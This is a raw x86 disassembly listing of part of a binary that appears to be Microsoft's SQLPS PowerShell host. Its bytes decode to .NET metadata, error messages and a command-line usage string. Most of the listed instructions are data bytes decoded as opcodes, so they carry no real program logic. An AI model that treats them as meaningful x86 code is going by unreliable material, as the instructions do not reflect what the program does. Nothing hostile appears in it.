  402678:	jo     0x4026a2
  40267a:	push   ss
  40267b:	add    BYTE PTR [eax],al
  40267d:	push   es
  40267e:	sub    ch,BYTE PTR [esi]
  402680:	jb     0x40266e
  402682:	add    al,BYTE PTR [eax]
  402684:	jo     0x4026ae
  402686:	push   ss
  402687:	add    BYTE PTR [eax],al
  402689:	push   es
  40268a:	sub    cl,BYTE PTR [esi+0x72]
  40268d:	push   ss
  40268e:	add    eax,DWORD PTR [eax]
  402690:	jo     0x402694
  402692:	mov    WORD PTR [edx+0x0],es
  402695:	add    BYTE PTR [ecx],al
  402697:	add    eax,DWORD PTR [eax+ebp*1]
  40269a:	sbb    BYTE PTR [eax],al
  40269c:	add    BYTE PTR [esi],al
  40269e:	sub    dh,BYTE PTR [edx]
  4026a0:	jb     0x4026ea
  4026a2:	add    eax,DWORD PTR [eax]
  4026a4:	jo     0x4026a8
  4026a6:	sub    BYTE PTR [edi],dl
  4026a8:	add    BYTE PTR [eax],al
  4026aa:	push   es
  4026ab:	sub    bl,BYTE PTR [esi]
  4026ad:	add    ch,BYTE PTR [eax]
  4026af:	pop    eax
  4026b0:	add    BYTE PTR [eax],al
  4026b2:	or     ch,BYTE PTR [edx]
  4026b4:	sbb    bh,BYTE PTR [esi+0xc]
  4026b7:	add    BYTE PTR [eax],al
  4026b9:	add    al,0x2a
  4026bb:	push   ds
  4026bc:	add    al,BYTE PTR [eax+0x400000c]
  4026c2:	sub    al,BYTE PTR [esi+0x7e]
  4026c5:	or     eax,DWORD PTR [eax]
  4026c7:	add    BYTE PTR [edx+eax*1],al
  4026ca:	jle    0x4026d8
  4026cc:	add    BYTE PTR [eax],al
  4026ce:	add    al,0x6f
  4026d0:	pop    edx
  4026d1:	add    BYTE PTR [eax],al
  4026d3:	or     ch,BYTE PTR [edx]
  4026d5:	add    BYTE PTR [eax],al
  4026d7:	add    BYTE PTR [ebx],dl
  4026d9:	xor    BYTE PTR ds:0x2700,al
  4026df:	add    BYTE PTR [esi],al
  4026e1:	add    BYTE PTR [eax],al
  4026e3:	adc    DWORD PTR [eax],ebp
  4026e5:	pop    ebx
  4026e6:	add    BYTE PTR [eax],al
  4026e8:	or     bh,BYTE PTR [esi+0xb]
  4026eb:	add    BYTE PTR [eax],al
  4026ed:	add    al,0x2
  4026ef:	jle    0x4026fd
  4026f1:	add    BYTE PTR [eax],al
  4026f3:	add    al,0x6f
  4026f5:	pop    edx
  4026f6:	add    BYTE PTR [eax],al
  4026f8:	or     dl,BYTE PTR [edi]
  4026fa:	lea    eax,[ecx]
  4026fc:	add    BYTE PTR [eax],al
  4026fe:	add    DWORD PTR [edx],ecx
  402700:	push   es
  402701:	push   ss
  402702:	add    esp,DWORD PTR [edx+0x1f2806]
  402708:	add    BYTE PTR [edx],cl
  40270a:	sub    al,BYTE PTR [eax]
  40270c:	adc    esi,DWORD PTR [eax]
  40270e:	add    eax,0x2f00
  402713:	add    BYTE PTR [esi],al
  402715:	add    BYTE PTR [eax],al
  402717:	adc    DWORD PTR [eax],ebp
  402719:	pop    ebx
  40271a:	add    BYTE PTR [eax],al
  40271c:	or     bh,BYTE PTR [esi+0xb]
  40271f:	add    BYTE PTR [eax],al
  402721:	add    al,0x2
  402723:	jle    0x402731
  402725:	add    BYTE PTR [eax],al
  402727:	add    al,0x6f
  402729:	pop    edx
  40272a:	add    BYTE PTR [eax],al
  40272c:	or     bl,BYTE PTR [ecx]
  40272e:	lea    eax,[ecx]
  402730:	add    BYTE PTR [eax],al
  402732:	add    DWORD PTR [edx],ecx
  402734:	push   es
  402735:	push   ss
  402736:	add    esp,DWORD PTR [edx-0x5dfbe8fa]
  40273c:	push   es
  40273d:	sbb    BYTE PTR ds:0x1f2806a2,al
  402743:	add    BYTE PTR [eax],al
  402745:	or     ch,BYTE PTR [edx]
  402747:	rcl    al,cl
  402749:	add    eax,DWORD PTR [eax]
  40274b:	add    BYTE PTR [edx],al
  40274d:	sub    BYTE PTR [esi],ah
  40274f:	add    BYTE PTR [eax],al
  402751:	or     ch,BYTE PTR [edi+0x5c]
  402754:	add    BYTE PTR [eax],al
  402756:	or     dl,al
  402758:	add    eax,DWORD PTR [eax]
  40275a:	add    BYTE PTR [edx],al
  40275c:	sub    BYTE PTR [esi],ah
  40275e:	add    BYTE PTR [eax],al
  402760:	or     ch,BYTE PTR [edi+0x5d]
  402763:	add    BYTE PTR [eax],al
  402765:	or     ch,BYTE PTR [edi+0x5e]
  402768:	add    BYTE PTR [eax],al
  40276a:	or     dh,BYTE PTR [ebx+0x5f]
  40276d:	add    BYTE PTR [eax],al
  40276f:	or     al,BYTE PTR [eax+0x400000b]
  402775:	adc    al,0x80
  402777:	or     al,0x0
  402779:	add    BYTE PTR [edx+ebp*1],al
  40277c:	sbb    dh,BYTE PTR [edx-0x78]
  40277f:	add    eax,DWORD PTR [eax]
  402781:	jo     0x4027ad
  402783:	add    BYTE PTR [eax],al
  402785:	add    BYTE PTR [eax],al
  402787:	add    BYTE PTR [ebp+0xc],dl
  40278a:	add    BYTE PTR [eax],al
  40278c:	into   
  40278d:	retf   0xbeef
  402790:	add    DWORD PTR [eax],eax
  402792:	add    BYTE PTR [eax],al
  402794:	xchg   ecx,eax
  402795:	add    BYTE PTR [eax],al
  402797:	add    BYTE PTR [ebx+edx*2+0x79],ch
  40279b:	jae    0x402811
  40279d:	gs ins DWORD PTR es:[edi],dx
  40279f:	cs push edx
  4027a1:	gs jae 0x402813
  4027a4:	jne    0x402818
  4027a6:	arpl   WORD PTR [ebp+0x73],sp
  4027a9:	cs push edx
  4027ab:	gs jae 0x40281d
  4027ae:	jne    0x402822
  4027b0:	arpl   WORD PTR [ebp+0x52],sp
  4027b3:	gs popa 
  4027b5:	fs gs jb 0x4027e5
  4027b9:	and    BYTE PTR [ebp+0x73],ch
  4027bc:	arpl   WORD PTR [edi+0x72],bp
  4027bf:	ins    BYTE PTR es:[edi],dx
  4027c0:	imul   esp,DWORD PTR [edx+0x2c],0x72655620
  4027c7:	jae    0x402832
  4027c9:	outs   dx,DWORD PTR ds:[esi]
  4027ca:	outs   dx,BYTE PTR ds:[esi]
  4027cb:	cmp    eax,0x2e302e32
  4027d0:	xor    BYTE PTR [esi],ch
  4027d2:	xor    BYTE PTR [eax+eiz*1],ch
  4027d5:	inc    ebx
  4027d6:	jne    0x402844
  4027d8:	je     0x40284f
  4027da:	jb     0x402841
  4027dc:	cmp    eax,0x7475656e
  4027e1:	jb     0x402844
  4027e3:	ins    BYTE PTR es:[edi],dx
  4027e4:	sub    al,0x20
  4027e6:	push   eax
  4027e7:	jne    0x40284b
  4027e9:	ins    BYTE PTR es:[edi],dx
  4027ea:	imul   esp,DWORD PTR [ebx+0x4b],0x6f547965
  4027f1:	imul   esp,DWORD PTR [ebp+0x6e],0x3d
  4027f5:	bound  esi,QWORD PTR [edi]
  4027f7:	aaa    
  4027f8:	popa   
  4027f9:	xor    eax,0x31363563
  4027fe:	cmp    DWORD PTR [ebx],esi
  402800:	xor    al,0x65
  402802:	xor    BYTE PTR [eax],bh
  402804:	cmp    DWORD PTR [ebx],esp
  402806:	push   ebx
  402807:	jns    0x40287c
  402809:	je     0x402870
  40280b:	ins    DWORD PTR es:[edi],dx
  40280c:	cs push edx
  40280e:	gs jae 0x402880
  402811:	jne    0x402885
  402813:	arpl   WORD PTR [ebp+0x73],sp
  402816:	cs push edx
  402818:	jne    0x402888
  40281a:	je     0x402885
  40281c:	ins    DWORD PTR es:[edi],dx
  40281d:	gs push edx
  40281f:	gs jae 0x402891
  402822:	jne    0x402896
  402824:	arpl   WORD PTR [ebp+0x53],sp
  402827:	gs je  0x40282c
  40282a:	add    BYTE PTR [eax],al
  40282c:	add    BYTE PTR [edx],cl
  40282e:	add    BYTE PTR [eax],al
  402830:	add    BYTE PTR [eax],al
  402832:	add    BYTE PTR [eax],al
  402834:	add    BYTE PTR [eax+0x41],dl
  402837:	inc    esp
  402838:	push   eax
  402839:	inc    ecx
  40283a:	inc    esp
  40283b:	push   eax
  40283c:	rcr    DWORD PTR [ebp+0x4c],1
  40283f:	lahf   
  402840:	(bad)  
  402841:	jne    0x4027f7
  402843:	mov    eax,0xee1fd5e8
  402848:	hlt    
  402849:	adc    cl,BYTE PTR [edi]
  40284b:	lock dec edi
  40284d:	fist   WORD PTR [eax]
  40284f:	or     DWORD PTR [ebx+ecx*1],edx
  402852:	sti    
  402853:	and    dh,BYTE PTR [eax]
  402855:	test   DWORD PTR [edi+0x35],ebx
  402858:	fucomp st(4)
  40285a:	lahf   
  40285b:	push   esi
  40285c:	add    BYTE PTR [edi-0x74],0x67
  402860:	je     0x402863
  402862:	xchg   BYTE PTR [eax+eax*1+0x0],bh
  402866:	add    BYTE PTR [eax],al
  402868:	add    DWORD PTR gs:[eax],eax
  40286b:	add    BYTE PTR [esi],dh
  40286d:	add    BYTE PTR [eax],al
  40286f:	add    BYTE PTR [ecx],dl
  402871:	add    BYTE PTR [eax],al
  402873:	add    BYTE PTR [eax],dh
  402875:	add    DWORD PTR [eax],eax
  402877:	add    BYTE PTR [ebx+0x0],ah
  40287a:	add    BYTE PTR [eax],al
  40287c:	mov    WORD PTR [eax],es
  40287e:	add    BYTE PTR [eax],al
  402880:	add    eax,DWORD PTR [ecx]
  402882:	add    BYTE PTR [eax],al
  402884:	int    0x0
  402886:	add    BYTE PTR [eax],al
  402888:	test   BYTE PTR [eax],0x0
  40288b:	add    BYTE PTR [edx+eax*1+0x420c0000],ch
  402892:	add    BYTE PTR [ecx+0x0],ah
  402895:	outs   dx,BYTE PTR ds:[esi]
  402896:	add    BYTE PTR [esi+0x0],ch
  402899:	add    BYTE PTR gs:[edx+0x0],dh
  40289d:	add    BYTE PTR [eax],al
  40289f:	add    BYTE PTR [eax],al
  4028a1:	and    BYTE PTR [ebx+0x0],al
  4028a4:	popa   
  4028a5:	add    BYTE PTR [esi+0x0],ch
  4028a8:	outs   dx,BYTE PTR ds:[esi]
  4028a9:	add    BYTE PTR [edi+0x0],ch
  4028ac:	je     0x4028ae
  4028ae:	dec    ecx
  4028af:	add    BYTE PTR [esi+0x0],ch
  4028b2:	imul   eax,DWORD PTR [eax],0x690074
  4028b8:	popa   
  4028b9:	add    BYTE PTR [eax+eax*1+0x69],ch
  4028bd:	add    BYTE PTR [edx+0x0],bh
  4028c0:	add    BYTE PTR gs:[edi],dl
  4028c3:	add    BYTE PTR [eax],al
  4028c5:	add    BYTE PTR [eax],ch
  4028c7:	inc    ebp
  4028c8:	add    BYTE PTR [ebp+0x0],ch
  4028cb:	jo     0x4028cd
  4028cd:	je     0x4028cf
  4028cf:	jns    0x4028d1
  4028d1:	push   eax
  4028d2:	add    BYTE PTR [ecx+0x0],ch
  4028d5:	jo     0x4028d7
  4028d7:	add    BYTE PTR gs:[eax+eax*1+0x69],ch
  4028dc:	add    BYTE PTR [esi+0x0],ch
  4028df:	add    BYTE PTR gs:[edx+0x0],dl
  4028e3:	add    BYTE PTR gs:[ebx+0x0],dh
  4028e7:	jne    0x4028e9
  4028e9:	ins    BYTE PTR es:[edi],dx
  4028ea:	add    BYTE PTR [eax+eax*1+0x73],dh
  4028ee:	add    BYTE PTR [eax],bh
  4028f0:	add    BYTE PTR [eax],al
  4028f2:	add    BYTE PTR [eax*2+0x70006d00],ah
  4028f9:	add    BYTE PTR [eax+eax*1+0x79],dh
  4028fd:	add    BYTE PTR [ebx+0x0],dl
  402900:	arpl   WORD PTR [eax],ax
  402902:	jb     0x402904
  402904:	imul   eax,DWORD PTR [eax],0x740070
  40290a:	dec    ebp
  40290b:	add    BYTE PTR [ebp+0x0],ah
  40290e:	jae    0x402910
  402910:	jae    0x402912
  402912:	popa   
  402913:	add    BYTE PTR [edi+0x0],ah
  402916:	add    BYTE PTR gs:[ecx+0x3c000000],ch
  40291d:	inc    ebp
  40291e:	add    BYTE PTR [edx+0x0],dh
  402921:	jb     0x402923
  402923:	outs   dx,DWORD PTR ds:[esi]
  402924:	add    BYTE PTR [edx+0x0],dh
  402927:	inc    ecx
  402928:	add    BYTE PTR [eax+eax*1+0x6c],ch
  40292c:	add    BYTE PTR [edi+0x0],ch
  40292f:	arpl   WORD PTR [eax],ax
  402931:	popa   
  402932:	add    BYTE PTR [eax+eax*1+0x69],dh
  402936:	add    BYTE PTR [esi+0x0],ch
  402939:	add    BYTE PTR [di+0x0],cl
  40293d:	add    BYTE PTR gs:[ebp+0x0],ch
  402941:	outs   dx,DWORD PTR ds:[esi]
  402942:	add    BYTE PTR [edx+0x0],dh
  402945:	jns    0x402947
  402947:	inc    esi
  402948:	add    BYTE PTR [edi+0x0],ch
  40294b:	jb     0x40294d
  40294d:	push   ebx
  40294e:	add    BYTE PTR [ebx+0x0],ah
  402951:	jb     0x402953
  402953:	imul   eax,DWORD PTR [eax],0x740070
  402959:	jmp    0x40295b
  40295b:	add    BYTE PTR [eax],al
  40295d:	and    al,0x45
  40295f:	add    BYTE PTR [edx+0x0],dh
  402962:	jb     0x402964
  402964:	outs   dx,DWORD PTR ds:[esi]
  402965:	add    BYTE PTR [edx+0x0],dh
  402968:	push   edx
  402969:	add    BYTE PTR [ebp+0x0],ah
  40296c:	popa   
  40296d:	add    BYTE PTR [eax+eax*1+0x69],ah
  402971:	add    BYTE PTR [esi+0x0],ch
  402974:	add    BYTE PTR [bp+di+0x0],dl
  402978:	arpl   WORD PTR [eax],ax
  40297a:	jb     0x40297c
  40297c:	imul   eax,DWORD PTR [eax],0x740070
  402982:	mov    ds:0x8000001,eax
  402987:	dec    eax
  402988:	add    BYTE PTR [ebp+0x0],ah
  40298b:	ins    BYTE PTR es:[edi],dx
  40298c:	add    BYTE PTR [eax+0x0],dh
  40298f:	add    al,0x2
  402991:	add    BYTE PTR [eax],al
  402993:	sub    BYTE PTR [esi+0x0],cl
  402996:	outs   dx,DWORD PTR ds:[esi]
  402997:	add    BYTE PTR [esi+0x0],ch
  40299a:	push   esp
  40299b:	add    BYTE PTR [ebp+0x0],ah
  40299e:	jb     0x4029a0
  4029a0:	ins    DWORD PTR es:[edi],dx
  4029a1:	add    BYTE PTR [ecx+0x0],ch
  4029a4:	outs   dx,BYTE PTR ds:[esi]
  4029a5:	add    BYTE PTR [ecx+0x0],ah
  4029a8:	je     0x4029aa
  4029aa:	imul   eax,DWORD PTR [eax],0x67006e
  4029b0:	inc    ebp
  4029b1:	add    BYTE PTR [edx+0x0],dh
  4029b4:	jb     0x4029b6
  4029b6:	outs   dx,DWORD PTR ds:[esi]
  4029b7:	add    BYTE PTR [edx+0x0],dh
  4029ba:	jae    0x4029bc
  4029bc:	repnz pop es
  4029be:	add    BYTE PTR [eax],al
  4029c0:	xor    BYTE PTR [ebx+0x0],dl
  4029c3:	arpl   WORD PTR [eax],ax
  4029c5:	jb     0x4029c7
  4029c7:	imul   eax,DWORD PTR [eax],0x740070
  4029cd:	inc    ebp
  4029ce:	add    BYTE PTR [eax+0x0],bh
  4029d1:	add    BYTE PTR gs:[ebx+0x0],ah
  4029d5:	jne    0x4029d7
  4029d7:	je     0x4029d9
  4029d9:	imul   eax,DWORD PTR [eax],0x6e006f
  4029df:	inc    ebp
  4029e0:	add    BYTE PTR [eax+0x0],bh
  4029e3:	arpl   WORD PTR [eax],ax
  4029e5:	add    BYTE PTR gs:[eax+0x0],dh
  4029e9:	je     0x4029eb
  4029eb:	imul   eax,DWORD PTR [eax],0x6e006f
  4029f1:	dec    edx
  4029f2:	or     BYTE PTR [eax],al
  4029f4:	add    BYTE PTR [esi],bh
  4029f6:	push   ebp
  4029f7:	add    BYTE PTR [esi+0x0],ch
  4029fa:	imul   eax,DWORD PTR [eax],0x6e
  4029fd:	add    BYTE PTR [edi+0x0],ch
  402a00:	ja     0x402a02
  402a02:	outs   dx,BYTE PTR ds:[esi]
  402a03:	add    BYTE PTR [ebx+0x0],dl
  402a06:	arpl   WORD PTR [eax],ax
  402a08:	jb     0x402a0a
  402a0a:	imul   eax,DWORD PTR [eax],0x740070
  402a10:	inc    ebp
  402a11:	add    BYTE PTR [eax+0x0],bh
  402a14:	add    BYTE PTR gs:[ebx+0x0],ah
  402a18:	jne    0x402a1a
  402a1a:	je     0x402a1c
  402a1c:	imul   eax,DWORD PTR [eax],0x6e006f
  402a22:	inc    ebp
  402a23:	add    BYTE PTR [eax+0x0],bh
  402a26:	arpl   WORD PTR [eax],ax
  402a28:	add    BYTE PTR gs:[eax+0x0],dh
  402a2c:	je     0x402a2e
  402a2e:	imul   eax,DWORD PTR [eax],0x6e006f
  402a34:	adc    BYTE PTR [ecx],cl
  402a36:	add    BYTE PTR [eax],al
  402a38:	add    DWORD PTR ds:0xd7d307b,edx
  402a3e:	or     dl,BYTE PTR [esi+0x65]
  402a41:	jb     0x402ab6
  402a43:	imul   ebp,DWORD PTR [edi+0x6e],0x7d317b20
  402a4a:	or     eax,0x7d327b0a
  402a4f:	add    DWORD PTR [edi],ebx
  402a51:	push   ebx
  402a52:	push   ecx
  402a53:	dec    esp
  402a54:	push   eax
  402a55:	push   ebx
  402a56:	and    BYTE PTR [esi+0x61],ah
  402a59:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x206f7420
  402a61:	imul   ebp,DWORD PTR [esi+0x69],0x6c616974
  402a68:	imul   edi,DWORD PTR [edx+0x65],0x307b203a
  402a6f:	jge    0x402a72
  402a71:	outs   dx,DWORD PTR ds:[esi]
  402a72:	push   ebx
  402a73:	arpl   WORD PTR [edx+0x69],si
  402a76:	jo     0x402aec
  402a78:	and    BYTE PTR [ecx+0x6e],ch
  402a7b:	jbe    0x402aec
  402a7d:	arpl   WORD PTR [ecx+0x74],sp
  402a80:	imul   ebp,DWORD PTR [edi+0x6e],0x206e6f20
  402a87:	push   eax
  402a88:	outs   dx,DWORD PTR ds:[esi]
  402a89:	ja     0x402af0
  402a8b:	jb     0x402ae0
  402a8d:	push   0x206c6c65
  402a92:	jo     0x402afd
  402a94:	jo     0x402afb
  402a96:	ins    BYTE PTR es:[edi],dx
  402a97:	imul   ebp,DWORD PTR [esi+0x65],0x74657220
  402a9e:	jne    0x402b12
  402aa0:	outs   dx,BYTE PTR ds:[esi]
  402aa1:	gs and BYTE PTR fs:[ebp+0x6d],ah
  402aa6:	jo     0x402b1c
  402aa8:	jns    0x402aca
  402aaa:	jb     0x402b11
  402aac:	jae    0x402b23
  402aae:	ins    BYTE PTR es:[edi],dx
  402aaf:	je     0x402adf
  402ab1:	and    BYTE PTR [eax+ebp*2+0x69],dl
  402ab5:	jae    0x402ad7
  402ab7:	arpl   WORD PTR [edi+0x75],bp
  402aba:	ins    BYTE PTR es:[edi],dx
  402abb:	and    BYTE PTR fs:[edx+0x65],ah
  402abf:	and    BYTE PTR [ebp+esi*2+0x65],ah
  402ac3:	and    BYTE PTR [edi+ebp*2+0x20],dh
  402ac7:	gs jb  0x402b3c
  402aca:	outs   dx,DWORD PTR ds:[esi]
  402acb:	jb     0x402aed
  402acd:	imul   ebp,DWORD PTR [esi+0x20],0x69726373
  402ad4:	jo     0x402b4a
  402ad6:	and    BYTE PTR [ebp+0x78],ah
  402ad9:	arpl   WORD PTR gs:[ebp+0x74],si
  402add:	imul   ebp,DWORD PTR [edi+0x6e],0x4940012e
  402ae4:	outs   dx,BYTE PTR ds:[esi]
  402ae5:	je     0x402b4c
  402ae7:	jb     0x402b57
  402ae9:	popa   
  402aea:	ins    BYTE PTR es:[edi],dx
  402aeb:	and    BYTE PTR [ebp+0x72],ah
  402aee:	jb     0x402b5f
  402af0:	jb     0x402b2c
  402af2:	and    BYTE PTR [ecx+0x20],al
  402af5:	push   0x6f
  402af7:	bound  esp,QWORD PTR [eax]
  402af9:	jae    0x402b6f
  402afb:	gs jo  0x402b1e
  402afe:	arpl   WORD PTR [edi+0x6e],bp
  402b01:	je     0x402b64
  402b03:	imul   ebp,DWORD PTR [esi+0x65],0x6e612064
  402b0a:	and    BYTE PTR [ebp+0x6d],ah
  402b0d:	jo     0x402b83
  402b0f:	jns    0x402b31
  402b11:	push   eax
  402b12:	outs   dx,DWORD PTR ds:[esi]
  402b13:	ja     0x402b7a
  402b15:	jb     0x402b6a
  402b17:	push   0x206c6c65
  402b1c:	jae    0x402b81
  402b1e:	jb     0x402b89
  402b20:	jo     0x402b96
  402b22:	add    DWORD PTR cs:[ebp+0x65685401],esi
  402b29:	jb     0x402b90
  402b2b:	and    BYTE PTR [edi+0x61],dh
  402b2e:	jae    0x402b50
  402b30:	outs   dx,BYTE PTR ds:[esi]
  402b31:	outs   dx,DWORD PTR ds:[esi]
  402b32:	je     0x402b54
  402b34:	outs   dx,BYTE PTR gs:[esi]
  402b36:	outs   dx,DWORD PTR ds:[esi]
  402b37:	jne    0x402ba0
  402b39:	push   0x6d656d20
  402b3e:	outs   dx,DWORD PTR ds:[esi]
  402b3f:	jb     0x402bba
  402b41:	and    BYTE PTR [edi+ebp*2+0x20],dh
  402b45:	jb     0x402bac
  402b47:	popa   
  402b48:	and    BYTE PTR fs:[eax+ebp*2+0x65],dh
  402b4d:	and    BYTE PTR [eax+0x6f],dl
  402b50:	ja     0x402bb7
  402b52:	jb     0x402ba7
  402b54:	push   0x206c6c65
  402b59:	jae    0x402bbe
  402b5b:	jb     0x402bc6
  402b5d:	jo     0x402bd3
  402b5f:	and    BYTE PTR [esi+0x6f],ah
  402b62:	jb     0x402b84
  402b64:	popa   
  402b65:	and    BYTE PTR [edx+0x6f],ch
  402b68:	bound  esp,QWORD PTR [eax]
  402b6a:	jae    0x402be0
  402b6c:	gs jo  0x402b9d
  402b6f:	and    BYTE PTR [eax],ah
  402b71:	pop    ecx
  402b72:	outs   dx,DWORD PTR ds:[esi]
  402b73:	jne    0x402b95
  402b75:	arpl   WORD PTR [ecx+0x6e],sp
  402b78:	and    BYTE PTR [esi+0x72],ah
  402b7b:	gs and BYTE PTR gs:[ebp+0x65],ch
  402b80:	ins    DWORD PTR es:[edi],dx
  402b81:	outs   dx,DWORD PTR ds:[esi]
  402b82:	jb     0x402bfd
  402b84:	and    BYTE PTR [edx+0x79],ah
  402b87:	and    BYTE PTR [ebx+0x6c],ah
  402b8a:	outs   dx,DWORD PTR ds:[esi]
  402b8b:	jae    0x402bf6
  402b8d:	outs   dx,BYTE PTR ds:[esi]
  402b8e:	and    BYTE PTR [bx+di+0x6e],ch
  402b92:	popa   
  402b93:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  402b97:	and    BYTE PTR gs:[ecx+0x70],ah
  402b9b:	jo     0x402c09
  402b9d:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  402ba4:	jae    0x402bd2
  402ba6:	and    BYTE PTR [edi+0x72],ch
  402ba9:	and    BYTE PTR [edx+0x79],ah
  402bac:	and    BYTE PTR [ebx+0x70],dh
  402baf:	ins    BYTE PTR es:[edi],dx
  402bb0:	imul   esi,DWORD PTR [esp+esi*2+0x69],0x6120676e
  402bb8:	and    BYTE PTR [ecx+eiz*2+0x72],ch
  402bbc:	and    BYTE PTR gs:[bp+di+0x63],dh
  402bc1:	jb     0x402c2c
  402bc3:	jo     0x402c39
  402bc5:	and    BYTE PTR [ecx+0x6e],ch
  402bc8:	je     0x402c39
  402bca:	and    BYTE PTR [ebx+0x6d],dh
  402bcd:	popa   
  402bce:	ins    BYTE PTR es:[edi],dx
  402bcf:	ins    BYTE PTR es:[edi],dx
  402bd0:	gs jb  0x402bf3
  402bd3:	jae    0x402c38
  402bd5:	jb     0x402c40
  402bd7:	jo     0x402c4d
  402bd9:	jae    0x402c09
  402bdb:	add    DWORD PTR [edi+0x50],ebx
  402bde:	outs   dx,DWORD PTR ds:[esi]
  402bdf:	ja     0x402c46
  402be1:	jb     0x402c36
  402be3:	push   0x206c6c65
  402be8:	outs   dx,BYTE PTR gs:[esi]
  402bea:	arpl   WORD PTR [edi+0x75],bp
  402bed:	outs   dx,BYTE PTR ds:[esi]
  402bee:	je     0x402c55
  402bf0:	jb     0x402c57
  402bf2:	and    BYTE PTR fs:[ecx+0x6e],ah
  402bf6:	and    BYTE PTR [ebp+0x72],ah
  402bf9:	jb     0x402c6a
  402bfb:	jb     0x402c1d
  402bfd:	ja     0x402c67
  402bff:	imul   ebp,DWORD PTR [ebp+eiz*2+0x20],0x64616572
  402c07:	imul   ebp,DWORD PTR [esi+0x67],0x73206120
  402c0e:	arpl   WORD PTR [edx+0x69],si
  402c11:	jo     0x402c87
  402c13:	and    BYTE PTR [esi+0x72],ah
  402c16:	outs   dx,DWORD PTR ds:[esi]
  402c17:	ins    DWORD PTR es:[edi],dx
  402c18:	and    BYTE PTR [ecx+0x20],ah
  402c1b:	push   0x6f
  402c1d:	bound  esp,QWORD PTR [eax]
  402c1f:	jae    0x402c95
  402c21:	gs jo  0x402c52
  402c24:	and    BYTE PTR [eax+ebp*2+0x65],dl
  402c28:	and    BYTE PTR [eax+0x69],dh
  402c2b:	jo     0x402c92
  402c2d:	and    BYTE PTR [ebp+0x72],ah
  402c30:	jb     0x402ca1
  402c32:	jb     0x402c54
  402c34:	imul   esi,DWORD PTR [ebx+0x3a],0x7d307b20
  402c3b:	cs add ebx,ebp
  402c3e:	or     esi,DWORD PTR [ebx+0x71]
  402c41:	ins    BYTE PTR es:[edi],dx
  402c42:	jo     0x402cb7
  402c44:	and    BYTE PTR [ebx+0x20],bl
  402c47:	pop    ebx
  402c48:	and    BYTE PTR [ebx+0x2d],bl
  402c4b:	dec    esi
  402c4c:	outs   dx,DWORD PTR ds:[esi]
  402c4d:	dec    esp
  402c4e:	outs   dx,DWORD PTR ds:[esi]
  402c4f:	outs   dx,DWORD PTR ds:[si]
  402c51:	pop    ebp
  402c52:	and    BYTE PTR [ebx+0x2d],bl
  402c55:	dec    esi
  402c56:	outs   dx,DWORD PTR ds:[esi]
  402c57:	inc    ebp
  402c58:	js     0x402cc3
  402c5a:	je     0x402cb9
  402c5c:	and    BYTE PTR [ebx+0x2d],bl
  402c5f:	dec    esi
  402c60:	outs   dx,DWORD PTR ds:[esi]
  402c61:	push   eax
  402c62:	jb     0x402cd3
  402c64:	imul   bp,WORD PTR [ebp+eiz*2+0x5d],0xa0d
  402c6b:	and    BYTE PTR [eax],ah
  402c6d:	and    BYTE PTR [eax],ah
  402c6f:	and    BYTE PTR [eax],ah
  402c71:	and    BYTE PTR [eax],ah
  402c73:	and    BYTE PTR [eax],ah
  402c75:	pop    ebx
  402c76:	sub    eax,0x7074754f
  402c7b:	jne    0x402cf1
  402c7d:	inc    esi
  402c7e:	outs   dx,DWORD PTR ds:[esi]
  402c7f:	jb     0x402cee
  402c81:	popa   
  402c82:	je     0x402ca4
  402c84:	jnp    0x402cda
  402c86:	gs js  0x402cfd
  402c89:	and    BYTE PTR [eax+eiz*1+0x58],bh
  402c8d:	dec    ebp
  402c8e:	dec    esp
  402c8f:	jge    0x402cee
  402c91:	and    BYTE PTR [ebx+0x2d],bl
  402c94:	dec    ecx
  402c95:	outs   dx,BYTE PTR ds:[esi]
  402c96:	jo     0x402d0d
  402c98:	je     0x402ce0
  402c9a:	outs   dx,DWORD PTR ds:[esi]
  402c9b:	jb     0x402d0a
  402c9d:	popa   
  402c9e:	je     0x402cc0
  402ca0:	jnp    0x402cf6
  402ca2:	gs js  0x402d19
  402ca5:	and    BYTE PTR [eax+eiz*1+0x58],bh
  402ca9:	dec    ebp
  402caa:	dec    esp
  402cab:	jge    0x402d0a
  402cad:	or     eax,0x2020200a
  402cb2:	and    BYTE PTR [eax],ah
  402cb4:	and    BYTE PTR [eax],ah
  402cb6:	and    BYTE PTR [ebp+0xd],bl
  402cb9:	or     ah,BYTE PTR [eax]
  402cbb:	and    BYTE PTR [eax],ah
  402cbd:	and    BYTE PTR [eax],ah
  402cbf:	and    BYTE PTR [eax],ah
  402cc1:	and    BYTE PTR [ebx+0x2d],bl
  402cc4:	inc    ebx
  402cc5:	outs   dx,DWORD PTR ds:[esi]
  402cc6:	ins    DWORD PTR es:[edi],dx
  402cc7:	ins    DWORD PTR es:[edi],dx
  402cc8:	popa   
  402cc9:	outs   dx,BYTE PTR ds:[esi]
  402cca:	and    BYTE PTR fs:[ebx+0x20],bh
  402cce:	sub    eax,0x20200a0d
  402cd3:	and    BYTE PTR [eax],ah
  402cd5:	and    BYTE PTR [eax],ah
  402cd7:	and    BYTE PTR [eax],ah
  402cd9:	and    BYTE PTR [eax],ah
  402cdb:	and    BYTE PTR [eax],ah
  402cdd:	and    BYTE PTR [eax],ah
  402cdf:	and    BYTE PTR [eax],ah
  402ce1:	and    BYTE PTR [eax],ah
  402ce3:	jl     0x402d05
  402ce5:	cmp    al,0x73
  402ce7:	je     0x402d5b
  402ce9:	imul   ebp,DWORD PTR [esi+0x67],0x205b203e
  402cf0:	cmp    al,0x63
  402cf2:	outs   dx,DWORD PTR ds:[esi]
  402cf3:	ins    DWORD PTR es:[edi],dx
  402cf4:	ins    DWORD PTR es:[edi],dx
  402cf5:	popa   
  402cf6:	outs   dx,BYTE PTR ds:[esi]
  402cf7:	fs pop edi
  402cf9:	jo     0x402d5c
  402cfb:	jb     0x402d5e
  402cfd:	ins    DWORD PTR es:[edi],dx
  402cfe:	gs je  0x402d66
  402d01:	jb     0x402d76
  402d03:	and    BYTE PTR ds:[ebp+0xd],bl
  402d07:	or     ah,BYTE PTR [eax]
  402d09:	and    BYTE PTR [eax],ah
  402d0b:	and    BYTE PTR [eax],ah
  402d0d:	and    BYTE PTR [eax],ah
  402d0f:	and    BYTE PTR [eax],ah
  402d11:	and    BYTE PTR [eax],ah
  402d13:	and    BYTE PTR [eax],ah
  402d15:	and    BYTE PTR [eax],ah
  402d17:	and    BYTE PTR [eax],ah
  402d19:	and    BYTE PTR [eax+eiz*1+0x3c],bh
  402d1d:	jae    0x402d82
  402d1f:	jb     0x402d8a
